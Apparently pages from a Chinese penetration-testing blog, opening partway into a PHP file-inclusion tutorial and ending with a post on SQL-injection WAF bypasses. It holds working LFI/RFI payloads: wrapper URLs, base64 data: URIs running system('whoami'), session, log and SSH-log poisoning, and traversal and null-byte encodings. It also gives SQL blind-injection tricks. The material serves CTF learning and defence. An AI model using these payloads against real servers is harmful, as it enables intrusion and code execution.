<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p>
<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p>
<ol>
<li>php版本大于等于php5.3.0</li>
</ol>
<p>姿势：</p>
<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/9.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/9.png?raw=true" alt="img"></a></p>
<p>指定绝对路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>

<p>或者使用相对路径（这里test.zip就在当前目录下）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://test.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/10.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/10.png?raw=true" alt="img"></a></p>
<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p>
<ol>
<li>php版本大于等于php5.3.0</li>
</ol>
<p>姿势：<br>构造zip包的方法同phar。</p>
<p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/11.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/11.png?raw=true" alt="img"></a></p>
<p>若是使用相对路径，则会包含失败。</p>
<h3 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h3><p>利用条件：</p>
<ol>
<li>php版本大于等于php5.2</li>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ol>
<p>姿势一：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/6.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/6.png?raw=true" alt="img"></a></p>
<p>执行命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;</span><br></pre></td></tr></table></figure>

<p>姿势二：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>

<p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code><br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/7.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/7.png?raw=true" alt="img"></a></p>
<p>执行命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
<h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
<p>姿势：</p>
<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" alt="img"></a></p>
<p>常见的php-session存放位置：</p>
<ol>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/tmp/sess_PHPSESSID</li>
<li>/tmp/sessions/sess_PHPSESSID</li>
</ol>
<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/16.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/16.png?raw=true" alt="img"></a></p>
<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
<p>比如这篇文章：<a href="http://kb.hitcon.org/post/165429468072/透過-lfi-引入-php-session-檔案觸發-rce" target="_blank" rel="noopener">透過 LFI 引入 PHP session 檔案觸發 RCE</a></p>
<h2 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h2><h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p>
<p>姿势：</p>
<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>
<p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/12.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/12.png?raw=true" alt="img"></a></p>
<p>正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/13.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/13.png?raw=true" alt="img"></a></p>
<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
<p>这里提供一道包含日志的CTF题目：<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two" target="_blank" rel="noopener">SHACTF-2017- Bon Appétit (100)-writeup</a></p>
<h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
<p>姿势：</p>
<p>用ssh连接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost</span><br></pre></td></tr></table></figure>

<p>之后会提示输入密码等等，随便输入。</p>
<p>然后在remotehost的ssh-log中即可写入php代码：<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/17.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/17.png?raw=true" alt="img"></a></p>
<p>之后进行文件包含即可。</p>
<p>参考：<a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="noopener">RCE with LFI and SSH Log Poisoning</a></p>
<h2 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h2><p>利用条件：</p>
<ol>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ol>
<p>姿势：</p>
<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
<p>可以参考这个：</p>
<ol>
<li><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html" target="_blank" rel="noopener">The proc/self/environ Injection</a></li>
<li><a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="noopener">shell via LFI - proc/self/environ method</a></li>
</ol>
<h2 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h2><p>跟包含environ类似。</p>
<p>参考： <a href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method" target="_blank" rel="noopener">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
<h2 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h2><p><a href="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" target="_blank" rel="noopener"><img src="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" alt="img"></a></p>
<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](<a href="https://www.insomniasec.com/downloads/publications/LFI" target="_blank" rel="noopener">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</p>
<p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a href="https://chybeta.github.io/2017/08/22/XMAN夏令营-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup</a></p>
<h2 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h2><p>利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。</p>
<p>姿势：</p>
<p>往往要配合上传的姿势，不说了，太多了。</p>
<h2 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h2><p>一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了。</p>
<h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><p>接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的<code>include $_GET[&#39;file&#39;];</code>这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include &apos;/var/www/html/&apos;.$file.&apos;/test/test.php&apos;;?&gt;</span><br></pre></td></tr></table></figure>

<p>这样就很“难”直接去包含前面提到的种种文件。</p>
<h2 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h2><p>先考虑一下指定了前缀的情况吧。测试代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include &apos;/var/www/html/&apos;.$file;?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>这个最简单了，简要的提一下。</p>
<p>现在在/var/log/test.txt文件中有php代码<code>&lt;?php phpinfo();?&gt;</code>，则利用<code>../</code>可以进行目录遍历，比如我们尝试访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=../../log/test.txt</span><br></pre></td></tr></table></figure>

<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。</p>
<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/18.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/18.png?raw=true" alt="img"></a></p>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
<ul>
<li>利用url编码<ul>
<li>../<ul>
<li>%2e%2e%2f</li>
<li>..%2f</li>
<li>%2e%2e/</li>
</ul>
</li>
<li>..\<ul>
<li>%2e%2e%5c</li>
<li>..%5c</li>
<li>%2e%2e\</li>
</ul>
</li>
</ul>
</li>
<li>二次编码<ul>
<li>../<ul>
<li>%252e%252e%252f</li>
</ul>
</li>
<li>..\<ul>
<li>%252e%252e%255c</li>
</ul>
</li>
</ul>
</li>
<li>容器/服务器的编码方式<ul>
<li>../<ul>
<li>..%c0%af<ul>
<li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="noopener">Why does Directory traversal attack %C0%AF work?</a></li>
</ul>
</li>
<li>%c0%ae%c0%ae/<ul>
<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
<li>Apache Tomcat Directory Traversal</li>
</ul>
</li>
</ul>
</li>
<li>..\<ul>
<li>..%c1%9c</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h2><p>接着考虑指定后缀的情况。测试代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include $file.&apos;/test/test.php&apos;;?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>url格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure>

<p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</p>
<p>姿势一：query（？）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt?</span><br></pre></td></tr></table></figure>

<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt?/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/19.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/19.png?raw=true" alt="img"></a></p>
<p>姿势二：fragment（#）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt%23</span><br></pre></td></tr></table></figure>

<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt#/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作fragment从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。
<a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/20.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/20.png?raw=true" alt="img"></a></p>
<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p>前面有提到过利用zip协议和phar协议。假设现在测试代码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	$file = $_GET[&apos;file&apos;];	include $file.&apos;/test/test.php&apos;;?&gt;</span><br></pre></td></tr></table></figure>

<p>构造压缩包如下：<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/21.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/21.png?raw=true" alt="img"></a></p>
<p>其中test.php内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>

<p>利用zip协议，注意要指定绝对路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</span><br></pre></td></tr></table></figure>

<p>则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php</p>
<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/22.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/22.png?raw=true" alt="img"></a></p>
<p>能成功包含。</p>
<p>在利用phar协议的时候有些问题。哪位能指教一下？<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/23.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/23.png?raw=true" alt="img"></a></p>
<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>利用条件： php版本 &lt; php 5.2.8</p>
<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=././././。。。省略。。。././shell.txt</span><br></pre></td></tr></table></figure>

<p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
<h3 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h3><p>利用条件： php版本 &lt; php 5.3.4</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phpinfo.txt%00</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/24.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/24.png?raw=true" alt="img"></a></p>
<p>能利用00截断的场景现在应该很少了：）</p>
<h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol>
<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li>
<li>做好文件的权限管理</li>
<li>对危险字符进行过滤等等</li>
</ol>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/sql注入骚操作/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/17/sql注入骚操作/" class="post-title-link" itemprop="url">sql注入骚操作</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-17 11:19:53 / 修改时间：16:38:35" itemprop="dateCreated datePublished" datetime="2019-10-17T11:19:53+08:00">2019-10-17</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>IN之骚</p>
<p>这个我也偶然发现的，也不知前辈们有没有早已总结好的套路了。w3school上对in操作符的介绍：<a href="http://www.w3school.com.cn/sql/sql_in.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/sql/sql_in.asp</a></p>
<p>对它的描述：IN操作符允许我们在WHERE子句中规定多个值。也就说可以让我们依照一或数个不连续(discrete)的值的限制之内抓出数据库中的值。</p>
<p>举个例子：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/ed884b4df23f484694042329602fbe93_th.jpg" alt="img"></p>
<p>那它是否可用于在过滤等号和过滤like的sql注入情况下呢？</p>
<p>简单句式举例：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/4701be2e3b2b4cdbafaf4e08fbab5047_th.jpg" alt="img"></p>
<p>看来是稳稳的可以的，再组合其他注入句式，岂不有了更不错的注入姿势。</p>
<p>那对in的可多个值的特性有没有什么好的用法呢？一脸懵逼我的想到千倍爆破一句话木马的姿势，在注入get不到字段时候用它爆破一下字段也可以很大提高效率呀（好吧，貌似我异想天开了。）。这个特性我先记在小本本上了，以后说不定碰到合适的用处。</p>
<p>BETWEEN之骚</p>
<p>同样也是偶然发现，不过between+and的中and让人感觉挺鸡肋的。在w3chool上对between操作符的介绍：传送门对它的描述：BETWEEN操作符在WHERE子句中使用，作用是选取介于两个值之间的数据范围。也就说让我们可以运用一个范围(range)内抓出数据库中的值。</p>
<p>举个例子：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/7905a8a4d0f144cab7a7e7cea1723a2d.jpg" alt="img"></p>
<p>那它是否也可用于在过滤等号和过滤like的sql注入情况下呢？</p>
<p>看图：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/c0e9498436c046989e0927874a8530cf.jpg" alt="img"></p>
<p>看到了什么？纳尼？还怕单引号被过滤？再看个：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/762c5eee870446329cc85d897d185af9.jpg" alt="img"></p>
<p>还稳稳的支持十六进制绕过姿势。</p>
<p>这个姿势下换个语句：selectpassword from users where password between ‘a’ and’d’，再配合个脚本，这样岂不是能够直接跑password了？不就又get到一个盲注入姿势？还是那句话，由于and的限制，用起来就很鸡肋。</p>
<p>ORDERBY之骚</p>
<p>这个是利用orderby的排序的姿势进行盲注。利用条件就是要有对应注入出数据同一行的其他字段的回显（例如：想注入出password，web端要有username或者id或者……的回显）。</p>
<p>简单示例，假如要通过注入得到abcde用户密码，web页面有个username回显，那么就可以尝试这个姿势：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/1dbe2d4714cb4d49895389a369e450c9.jpg" alt="img"></p>
<p>通过orderby3对查询到的第三个字段password进行排序，改变select的第三字段位置的内容，如：aa时候web页面显示username为test，ab时候还是显示为test，ac时候变成了abcde，就证明password前两个字符为ab，然后依次再往后猜测……这个姿势再结合个脚本岂不美滋滋。</p>
<p>列名构造之骚</p>
<p>注入中有时候会遇到列名被waf的套路，万里之行只差出数据了，尴尬不已。在这时候，尝试自行构造一个列名也是很不错的选择。</p>
<p>从它：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/c3a845acb0f347568f744f8f6f8dedb7.jpg" alt="img"></p>
<p>到它：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/04614eb6f15448e6a1e9e93a74a438ca.jpg" alt="img"></p>
<p>不就新构出了列名？</p>
<p>再对它做个别名然后就可以不用列名注入出数据了：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/aec1d54223604c6e8fb84fcea2b42a8b.jpg" alt="img"></p>
<p>临时变量之骚</p>
<p>临时变量是什么想必大家都知道，这个姿势呢～需要临时变量结合into语法来进行利用，看个简单例子：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/52b3e2bf435f4f7c809976aeed027939.jpg" alt="img"></p>
<p>用into对临时变量@a赋值，再去查询@a是可以得到赋值内容的。</p>
<p>注入的时候怎么用呢？</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/3dfd7a8916ba453c888a7d6707d1f382.jpg" alt="img"></p>
<p>看起来很好利用的样子，其实放到web网站上就很鸡肋了。同一注入点先web请求进行into的临时变量赋值，再web请求进行临时变量查询时候，会发现它是行不通的。在第一个web连接结束时候，临时变量释放掉了，第二次web请求查询是找不到不到它的。</p>
<p>还有个实用的小利用：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/ea12c64dfef246d58d455ed88d460dc7.jpg" alt="img"></p>
<p>想到了什么？是不是可以用来orderby进行表的列数判断？</p>
<p>这样一来，能用它的情况现有三种场景：一个就是存在堆叠注入时候，另一个就是同web页面两个注入漏洞时候，再一个就是当orderby被waf后用来判断字段数目时候。</p>
<p>运算符之骚</p>
<p>话说sql也是世界上最好的语言……在运算符上的弱类型不仅仅是php的专利。</p>
<p>举个例子：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/0d9dde9ecd58483bb2472cd436ff5a19_th.jpg" alt="img"></p>
<p>反正你键盘上数学运算符都有这个特性。</p>
<p>用常用的^举例下sql注入时候的姿势及原因，先看下表的结构：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/2801ae06307e468998c0534bfde481ec.jpg" alt="img"></p>
<p>看好哟,username和password是varchar型。</p>
<p>下面用的查询语句是这样的：select* from users where username = ‘一个字符串’，然而在where子句后面再加上运算符，再看产生了什么：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/b8a4d7fe79f9409a9e580d7a975d25d6_th.jpg" alt="img"></p>
<blockquote>
<p>第一个给username=”^1，”^1的结果是数字1，相当于username=1，什么都没查询出来，还丢出来5个警告。</p>
<p>第二个给username=”^0，”^0的结果是数字0，相当于username=0，然后出来了表中所有数据。</p>
</blockquote>
<p>下面向数据库插入第五条数据，username为1defgh：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/ef57624d0a0a4ee485cba6d993117aa8_th.jpg" alt="img"></p>
<p>再用刚才的语句进行查询：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/036e6c7eb8f84751a83166c58f0b436f_th.jpg" alt="img"></p>
<p>再插入个username为ef1ghi的字段，进行查询：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/dcb5b9be12954ec6ba6e7f2c9815e24f_th.jpg" alt="img"></p>
<p>说明了什么？在应该传入字符串型的地方传入数字型参数后，select查询时进行了类型转换：数据库中该字段首字母非数字的都被传入0的时候查询出来，该字段首字母是1的会被传入1的时候查询出来。</p>
<p>理解了上面所说那就应该理解这个注入姿势了：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/5522d5ba42a94223b3df40571b6a4c58_th.jpg" alt="img"></p>
<p>大/小于号之骚</p>
<p>这个估计大多数都遇到过过，举个例子：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/d19adf2898a94ece9e49088dfae47424_th.jpg" alt="img"></p>
<p>这样估计都明白了，一个可以放在盲注语句中盲打的套路，在过滤严格无法盲注的情况下，同样可以放在where子句后面进行爆破：</p>
<p><img src="http://img.mp.itc.cn/upload/20170718/75d7b7b180954c598874667e8582e440_th.jpg" alt="img"></p>
<p>limit注入</p>
<p><a href="https://www.jianshu.com/p/6c1420a7a7d9" target="_blank" rel="noopener">https://www.jianshu.com/p/6c1420a7a7d9</a></p>
<p>总结</p>
<p>CTF中的SQL注入就是一个bypass与waf的斗争历程。一个的常用函数，一个的常用套路，经过多个之间巧妙的组合，总会出来bypass的更好更优美的姿势。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/详说Cookie-LocalStorage与SessionStorage/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
